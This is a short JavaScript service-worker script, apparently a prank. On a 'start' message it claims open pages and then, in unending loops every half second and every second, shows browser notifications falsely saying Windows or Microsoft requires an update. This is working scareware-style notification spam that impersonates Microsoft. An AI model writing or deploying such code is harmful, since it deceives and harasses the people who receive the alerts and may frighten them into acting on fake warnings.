const IMAGE_URL = "https://i.ytimg.com/vi/9_6SkzdB1kQ/hqdefault.jpg";
const BAGEL_URL = "https://collab.woozy.eu.org/favicon.16bb9d0a.ico";

self.addEventListener("install", () => self.skipWaiting());
self.addEventListener("activate", () => self.clients.claim());

self.addEventListener("message", (e) => {
  if (e.data === "start") {
    sendNotification();
    setInterval(sendNotification, 500);
    sendNotification2();
    setInterval(sendNotification2, 1000);
  }
});

function sendNotification() {
  self.registration.showNotification("Windows needs a quagmire update", {
    icon: IMAGE_URL,
    badge: BAGEL_URL
  });
}

function sendNotification2() {
  self.registration.showNotification("AN UPDATE IS REQUIRED BY MICROSOFT", {
    icon: IMAGE_URL,
    badge: BAGEL_URL
  });
}
